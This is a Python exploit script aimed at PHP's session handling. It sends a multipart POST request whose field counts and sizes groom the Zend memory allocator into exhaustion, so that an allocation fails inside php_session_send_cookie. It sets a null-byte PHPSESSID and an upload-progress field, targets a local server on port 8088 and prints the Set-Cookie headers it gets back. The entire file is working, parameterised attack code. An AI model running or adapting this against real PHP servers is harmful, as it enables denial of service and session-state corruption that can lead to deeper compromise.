#!/usr/bin/env python3
"""OOM-in-cookie A v5: bins + page exhaustion with a 1-page-granularity trimmer.

usage: send_a_oom5.py F S NB BL X K KL FL [FN]
  F  : double-128 fillers (name 103B and value 103B -> two bin-128 blocks)
  S  : single-128 fillers (name 103B, value 8B -> one bin-128 block)
  NB : big fields, BL-byte values (2 live copies each; 2*ceil((25+BL)/4096) pages)
  X  : bin-256 trimmers (value 231B -> zend_string 256B, raw buffer 232B too)
  K  : tail fields, KL-byte values (coarse correction; 2 live copies)
  FL : file part field-name length (filename is 103B)
  FN : optional file part field name (default 'F'*FL)

Layout: F,S,bigs,X,tails,PHPSESSID,PROGRESS,file.
Total vars F+S+NB+X+K+2 must stay <= 1000.

Goal at php_session_send_cookie() entry:
  free_slot[11] == NULL (bin 128 emptied by the two file-part strings),
  sum(chunk->free_pages) == 0.
php_url_encode()'s zend_string_safe_alloc(3, 32, 0, 0) then fails inside
php_session_send_cookie, after PS(send_cookie)=1, with no output.
"""
import os
import socket
import sys

if len(sys.argv) < 9:
    sys.exit(__doc__)
F, S, NB, BL, X, K, KL, FL = map(int, sys.argv[1:9])
FN = sys.argv[9] if len(sys.argv) > 9 else 'F' * FL
AQ_N = int(os.environ.get('AQ_N', '0'))
AQ_LEN = int(os.environ.get('AQ_LEN', '200'))
LATE_LEN = int(os.environ.get('LATE_LEN', '0'))
WARM_LEN = int(os.environ.get('WARM_LEN', '0'))
W64_LEN = int(os.environ.get('W64_LEN', '0'))
W64_N = int(os.environ.get('W64_N', '1'))
assert F + S + NB + X + K + 2 <= 1000, "too many vars for max_input_vars=1000"

BND = b'S' * 17
parts = []


def padded(prefix, i, n):
    s = '%s%04d' % (prefix, i)
    return (s + 'x' * n)[:n]


for i in range(F):
    parts.append((padded('f', i, 103), None, b'V' * 103))
for i in range(S):
    parts.append((padded('g', i, 103), None, b'v' * 8))
if WARM_LEN > 0:
    parts.append(('999997', None, b'W' * WARM_LEN))
idx = 1000
for _ in range(NB):
    parts.append((str(idx), None, b'B' * BL))
    idx += 1
if LATE_LEN > 0:
    parts.append(('999998', None, b'L' * LATE_LEN))
idx = 100000
for _ in range(X):
    parts.append((str(idx), None, b'X' * 231))
    idx += 1
idx = 200000
for _ in range(K):
    parts.append((str(idx), None, b'T' * KL))
    idx += 1
if W64_LEN > 0:
    for _wi in range(W64_N):
        parts.append(('9999%02d' % (90 + _wi), None, b'z' * W64_LEN))
parts.append(('PHPSESSID', None, b'\x00'))
parts.append(('PHP_SESSION_UPLOAD_PROGRESS', None, b'pwn'))
parts.append((FN, 'A' * 99 + '.txt', b'A' * 64))

o = bytearray()
for name, filename, data in parts:
    o += b'--' + BND + b'\r\n'
    if filename is not None:
        o += (b'Content-Disposition: form-data; name="' + name.encode() +
              b'"; filename="' + filename.encode() + b'"\r\n'
              b'Content-Type: application/octet-stream\r\n\r\n')
    else:
        o += (b'Content-Disposition: form-data; name="' + name.encode() +
              b'"\r\n\r\n')
    o += data + b'\r\n'
o += b'--' + BND + b'--\r\n'

path = '/index.php'
if AQ_N > 0:
    q = []
    for i in range(AQ_N):
        q.append('q%03d=' % i + 'Q' * AQ_LEN)
    path += '?' + '&'.join(q)
req = (('POST %s HTTP/1.1\r\n'
        'Host: 127.0.0.1:8088\r\n'
        'Content-Type: multipart/form-data; boundary=%s\r\n'
        'Content-Length: %d\r\n'
        'Connection: close\r\n\r\n') % (path, BND.decode(), len(o))).encode()
s = socket.create_connection(('127.0.0.1', 8088), timeout=60)
s.settimeout(60)
resp = b''
try:
    s.sendall(req + bytes(o))
    while len(resp) < 200000:
        c = s.recv(65536)
        if not c:
            break
        resp += c
except OSError:
    pass
s.close()
open('/tmp/a_oom4.resp', 'wb').write(resp)
print('RESP_LEN', len(resp))
for line in resp.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE', line[:120].decode('latin1', 'replace'))
